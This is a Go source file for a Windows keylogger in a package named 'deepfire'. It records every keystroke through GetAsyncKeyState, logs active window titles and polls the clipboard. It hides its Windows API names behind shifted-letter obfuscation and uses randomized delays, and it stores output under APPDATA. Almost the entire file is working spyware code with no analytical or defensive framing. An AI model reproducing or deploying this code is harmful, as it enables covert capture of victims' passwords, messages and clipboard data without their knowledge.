package deepfire

import (
	"os"
	"syscall"
	"time"
	"unsafe"

	"github.com/atotto/clipboard"
)

var tmpPath string = os.Getenv("APPDATA") + "\\keylogs.log"

var tmpKeylog string
var tmpTitle string

func StartLogger(mode int) {
	if mode == 0 { //Normal logger (everything until told to stop)
		go windowLogger()
		go keyLogger()
		go clipboardLogger()
	} else {
		//Selective Keylogger
	}
}

var user32 = syscall.NewLazyDLL(Deobfuscate("vtfs43/emm"))                       //user32.dll
var kernel32 = syscall.NewLazyDLL(Deobfuscate("lfsofm43/emm"))                   //kernel32.dll
var procGetForegroundWindow = user32.NewProc(Deobfuscate("HfuGpsfhspvoeXjoepx")) //GetForegroundWindow
var procGetWindowTextW = user32.NewProc(Deobfuscate("HfuXjoepxUfyuX"))           //GetWindowTextW
var procShowWindow = user32.NewProc(Deobfuscate("TipxXjoepx"))                   //ShowWindow
var procEnumWindows = user32.NewProc(Deobfuscate("FovnXjoepxt"))                 //EnumWindows
var procGetAsyncKeyState = user32.NewProc(Deobfuscate("HfuBtzodLfzTubuf"))       //GetAsyncKeyState
var caps bool
var shift bool

//Get Active Window Title
func getForegroundWindow() (hwnd syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)
	if e1 != 0 {
		err = error(e1)
		return
	}
	hwnd = syscall.Handle(r0)
	return
}

func getWindowText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32, err error) {
	r0, _, e1 := syscall.Syscall(procGetWindowTextW.Addr(), 3, uintptr(hwnd), uintptr(unsafe.Pointer(str)), uintptr(maxCount))
	len = int32(r0)
	if len == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func windowLogger() {
	for {
		g, _ := getForegroundWindow()
		b := make([]uint16, 200)
		_, err := getWindowText(g, &b[0], int32(len(b)))
		if err != nil {
		}
		if syscall.UTF16ToString(b) != "" {
			if tmpTitle != syscall.UTF16ToString(b) {
				tmpTitle = syscall.UTF16ToString(b)
				tmpPath += string("\r\n[" + syscall.UTF16ToString(b) + "]\r\n")
			}
		}
		time.Sleep(time.Duration(randInt(1, 5)) * time.Millisecond)
	}
}

func clipboardLogger() {
	tmp := ""
	for {
		text, _ := clipboard.ReadAll()
		if text != tmp {
			tmp = text
			tmpKeylog += string("\r\n[Clipboard: " + text + "]\r\n")
		}
		time.Sleep(time.Duration(randInt(1, 5)) * time.Second)
	}
}

const (
	// Virtual-Key Codes
	vk_BACK       = 0x08
	vk_TAB        = 0x09
	vk_CLEAR      = 0x0C
	vk_RETURN     = 0x0D
	vk_SHIFT      = 0x10
	vk_CONTROL    = 0x11
	vk_MENU       = 0x12
	vk_PAUSE      = 0x13
	vk_CAPITAL    = 0x14
	vk_ESCAPE     = 0x1B
	vk_SPACE      = 0x20
	vk_PRIOR      = 0x21
	vk_NEXT       = 0x22
	vk_END        = 0x23
	vk_HOME       = 0x24
	vk_LEFT       = 0x25
	vk_UP         = 0x26
	vk_RIGHT      = 0x27
	vk_DOWN       = 0x28
	vk_SELECT     = 0x29
	vk_PRINT      = 0x2A
	vk_EXECUTE    = 0x2B
	vk_SNAPSHOT   = 0x2C
	vk_INSERT     = 0x2D
	vk_DELETE     = 0x2E
	vk_LWIN       = 0x5B
	vk_RWIN       = 0x5C
	vk_APPS       = 0x5D
	vk_SLEEP      = 0x5F
	vk_NUMPAD0    = 0x60
	vk_NUMPAD1    = 0x61
	vk_NUMPAD2    = 0x62
	vk_NUMPAD3    = 0x63
	vk_NUMPAD4    = 0x64
	vk_NUMPAD5    = 0x65
	vk_NUMPAD6    = 0x66
	vk_NUMPAD7    = 0x67
	vk_NUMPAD8    = 0x68
	vk_NUMPAD9    = 0x69
	vk_MULTIPLY   = 0x6A
	vk_ADD        = 0x6B
	vk_SEPARATOR  = 0x6C
	vk_SUBTRACT   = 0x6D
	vk_DECIMAL    = 0x6E
	vk_DIVIDE     = 0x6F
	vk_F1         = 0x70
	vk_F2         = 0x71
	vk_F3         = 0x72
	vk_F4         = 0x73
	vk_F5         = 0x74
	vk_F6         = 0x75
	vk_F7         = 0x76
	vk_F8         = 0x77
	vk_F9         = 0x78
	vk_F10        = 0x79
	vk_F11        = 0x7A
	vk_F12        = 0x7B
	vk_NUMLOCK    = 0x90
	vk_SCROLL     = 0x91
	vk_LSHIFT     = 0xA0
	vk_RSHIFT     = 0xA1
	vk_LCONTROL   = 0xA2
	vk_RCONTROL   = 0xA3
	vk_LMENU      = 0xA4
	vk_RMENU      = 0xA5
	vk_OEM_1      = 0xBA
	vk_OEM_PLUS   = 0xBB
	vk_OEM_COMMA  = 0xBC
	vk_OEM_MINUS  = 0xBD
	vk_OEM_PERIOD = 0xBE
	vk_OEM_2      = 0xBF
	vk_OEM_3      = 0xC0
	vk_OEM_4      = 0xDB
	vk_OEM_5      = 0xDC
	vk_OEM_6      = 0xDD
	vk_OEM_7      = 0xDE
	vk_OEM_8      = 0xDF
)

func keyLogger() {
	for {
		time.Sleep(time.Duration(randInt(1, 5)) * time.Millisecond)
		shiftchk, _, _ := procGetAsyncKeyState.Call(uintptr(vk_SHIFT))
		if shiftchk == 0x8000 {
			shift = true
		} else {
			shift = false
		}
		for KEY := 0; KEY <= 256; KEY++ {
			Val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))
			if int(Val) == -32767 {
				switch KEY {
				case vk_CONTROL:
					tmpKeylog += "[Ctrl]"
				case vk_BACK:
					tmpKeylog += "[Back]"
				case vk_TAB:
					tmpKeylog += "[Tab]"
				case vk_RETURN:
					tmpKeylog += "[Enter]\r\n"
				case vk_SHIFT:
					tmpKeylog += "[Shift]"
				case vk_MENU:
					tmpKeylog += "[Alt]"
				case vk_CAPITAL:
					tmpKeylog += "[CapsLock]"
					if caps {
						caps = false
					} else {
						caps = true
					}
				case vk_ESCAPE:
					tmpKeylog += "[Esc]"
				case vk_SPACE:
					tmpKeylog += " "
				case vk_PRIOR:
					tmpKeylog += "[PageUp]"
				case vk_NEXT:
					tmpKeylog += "[PageDown]"
				case vk_END:
					tmpKeylog += "[End]"
				case vk_HOME:
					tmpKeylog += "[Home]"
				case vk_LEFT:
					tmpKeylog += "[Left]"
				case vk_UP:
					tmpKeylog += "[Up]"
				case vk_RIGHT:
					tmpKeylog += "[Right]"
				case vk_DOWN:
					tmpKeylog += "[Down]"
				case vk_SELECT:
					tmpKeylog += "[Select]"
				case vk_PRINT:
					tmpKeylog += "[Print]"
				case vk_EXECUTE:
					tmpKeylog += "[Execute]"
				case vk_SNAPSHOT:
					tmpKeylog += "[PrintScreen]"
				case vk_INSERT:
					tmpKeylog += "[Insert]"
				case vk_DELETE:
					tmpKeylog += "[Delete]"
				case vk_LWIN:
					tmpKeylog += "[LeftWindows]"
				case vk_RWIN:
					tmpKeylog += "[RightWindows]"
				case vk_APPS:
					tmpKeylog += "[Applications]"
				case vk_SLEEP:
					tmpKeylog += "[Sleep]"
				case vk_NUMPAD0:
					tmpKeylog += "[Pad 0]"
				case vk_NUMPAD1:
					tmpKeylog += "[Pad 1]"
				case vk_NUMPAD2:
					tmpKeylog += "[Pad 2]"
				case vk_NUMPAD3:
					tmpKeylog += "[Pad 3]"
				case vk_NUMPAD4:
					tmpKeylog += "[Pad 4]"
				case vk_NUMPAD5:
					tmpKeylog += "[Pad 5]"
				case vk_NUMPAD6:
					tmpKeylog += "[Pad 6]"
				case vk_NUMPAD7:
					tmpKeylog += "[Pad 7]"
				case vk_NUMPAD8:
					tmpKeylog += "[Pad 8]"
				case vk_NUMPAD9:
					tmpKeylog += "[Pad 9]"
				case vk_MULTIPLY:
					tmpKeylog += "*"
				case vk_ADD:
					if shift {
						tmpKeylog += "+"
					} else {
						tmpKeylog += "="
					}
				case vk_SEPARATOR:
					tmpKeylog += "[Separator]"
				case vk_SUBTRACT:
					if shift {
						tmpKeylog += "_"
					} else {
						tmpKeylog += "-"
					}
				case vk_DECIMAL:
					tmpKeylog += "."
				case vk_DIVIDE:
					tmpKeylog += "[Devide]"
				case vk_F1:
					tmpKeylog += "[F1]"
				case vk_F2:
					tmpKeylog += "[F2]"
				case vk_F3:
					tmpKeylog += "[F3]"
				case vk_F4:
					tmpKeylog += "[F4]"
				case vk_F5:
					tmpKeylog += "[F5]"
				case vk_F6:
					tmpKeylog += "[F6]"
				case vk_F7:
					tmpKeylog += "[F7]"
				case vk_F8:
					tmpKeylog += "[F8]"
				case vk_F9:
					tmpKeylog += "[F9]"
				case vk_F10:
					tmpKeylog += "[F10]"
				case vk_F11:
					tmpKeylog += "[F11]"
				case vk_F12:
					tmpKeylog += "[F12]"
				case vk_NUMLOCK:
					tmpKeylog += "[NumLock]"
				case vk_SCROLL:
					tmpKeylog += "[ScrollLock]"
				case vk_LSHIFT:
					tmpKeylog += "[LeftShift]"
				case vk_RSHIFT:
					tmpKeylog += "[RightShift]"
				case vk_LCONTROL:
					tmpKeylog += "[LeftCtrl]"
				case vk_RCONTROL:
					tmpKeylog += "[RightCtrl]"
				case vk_LMENU:
					tmpKeylog += "[LeftMenu]"
				case vk_RMENU:
					tmpKeylog += "[RightMenu]"
				case vk_OEM_1:
					if shift {
						tmpKeylog += ":"
					} else {
						tmpKeylog += ";"
					}
				case vk_OEM_2:
					if shift {
						tmpKeylog += "?"
					} else {
						tmpKeylog += "/"
					}
				case vk_OEM_3:
					if shift {
						tmpKeylog += "~"
					} else {
						tmpKeylog += "`"
					}
				case vk_OEM_4:
					if shift {
						tmpKeylog += "{"
					} else {
						tmpKeylog += "["
					}
				case vk_OEM_5:
					if shift {
						tmpKeylog += "|"
					} else {
						tmpKeylog += "\\"
					}
				case vk_OEM_6:
					if shift {
						tmpKeylog += "}"
					} else {
						tmpKeylog += "]"
					}
				case vk_OEM_7:
					if shift {
						tmpKeylog += `"`
					} else {
						tmpKeylog += "'"
					}
				case vk_OEM_PERIOD:
					if shift {
						tmpKeylog += ">"
					} else {
						tmpKeylog += "."
					}
				case 0x30:
					if shift {
						tmpKeylog += ")"
					} else {
						tmpKeylog += "0"
					}
				case 0x31:
					if shift {
						tmpKeylog += "!"
					} else {
						tmpKeylog += "1"
					}
				case 0x32:
					if shift {
						tmpKeylog += "@"
					} else {
						tmpKeylog += "2"
					}
				case 0x33:
					if shift {
						tmpKeylog += "#"
					} else {
						tmpKeylog += "3"
					}
				case 0x34:
					if shift {
						tmpKeylog += "$"
					} else {
						tmpKeylog += "4"
					}
				case 0x35:
					if shift {
						tmpKeylog += "%"
					} else {
						tmpKeylog += "5"
					}
				case 0x36:
					if shift {
						tmpKeylog += "^"
					} else {
						tmpKeylog += "6"
					}
				case 0x37:
					if shift {
						tmpKeylog += "&"
					} else {
						tmpKeylog += "7"
					}
				case 0x38:
					if shift {
						tmpKeylog += "*"
					} else {
						tmpKeylog += "8"
					}
				case 0x39:
					if shift {
						tmpKeylog += "("
					} else {
						tmpKeylog += "9"
					}
				case 0x41:
					if caps || shift {
						tmpKeylog += "A"
					} else {
						tmpKeylog += "a"
					}
				case 0x42:
					if caps || shift {
						tmpKeylog += "B"
					} else {
						tmpKeylog += "b"
					}
				case 0x43:
					if caps || shift {
						tmpKeylog += "C"
					} else {
						tmpKeylog += "c"
					}
				case 0x44:
					if caps || shift {
						tmpKeylog += "D"
					} else {
						tmpKeylog += "d"
					}
				case 0x45:
					if caps || shift {
						tmpKeylog += "E"
					} else {
						tmpKeylog += "e"
					}
				case 0x46:
					if caps || shift {
						tmpKeylog += "F"
					} else {
						tmpKeylog += "f"
					}
				case 0x47:
					if caps || shift {
						tmpKeylog += "G"
					} else {
						tmpKeylog += "g"
					}
				case 0x48:
					if caps || shift {
						tmpKeylog += "H"
					} else {
						tmpKeylog += "h"
					}
				case 0x49:
					if caps || shift {
						tmpKeylog += "I"
					} else {
						tmpKeylog += "i"
					}
				case 0x4A:
					if caps || shift {
						tmpKeylog += "J"
					} else {
						tmpKeylog += "j"
					}
				case 0x4B:
					if caps || shift {
						tmpKeylog += "K"
					} else {
						tmpKeylog += "k"
					}
				case 0x4C:
					if caps || shift {
						tmpKeylog += "L"
					} else {
						tmpKeylog += "l"
					}
				case 0x4D:
					if caps || shift {
						tmpKeylog += "M"
					} else {
						tmpKeylog += "m"
					}
				case 0x4E:
					if caps || shift {
						tmpKeylog += "N"
					} else {
						tmpKeylog += "n"
					}
				case 0x4F:
					if caps || shift {
						tmpKeylog += "O"
					} else {
						tmpKeylog += "o"
					}
				case 0x50:
					if caps || shift {
						tmpKeylog += "P"
					} else {
						tmpKeylog += "p"
					}
				case 0x51:
					if caps || shift {
						tmpKeylog += "Q"
					} else {
						tmpKeylog += "q"
					}
				case 0x52:
					if caps || shift {
						tmpKeylog += "R"
					} else {
						tmpKeylog += "r"
					}
				case 0x53:
					if caps || shift {
						tmpKeylog += "S"
					} else {
						tmpKeylog += "s"
					}
				case 0x54:
					if caps || shift {
						tmpKeylog += "T"
					} else {
						tmpKeylog += "t"
					}
				case 0x55:
					if caps || shift {
						tmpKeylog += "U"
					} else {
						tmpKeylog += "u"
					}
				case 0x56:
					if caps || shift {
						tmpKeylog += "V"
					} else {
						tmpKeylog += "v"
					}
				case 0x57:
					if caps || shift {
						tmpKeylog += "W"
					} else {
						tmpKeylog += "w"
					}
				case 0x58:
					if caps || shift {
						tmpKeylog += "X"
					} else {
						tmpKeylog += "x"
					}
				case 0x59:
					if caps || shift {
						tmpKeylog += "Y"
					} else {
						tmpKeylog += "y"
					}
				case 0x5A:
					if caps || shift {
						tmpKeylog += "Z"
					} else {
						tmpKeylog += "z"
					}
				}
			}
		}
	}
}
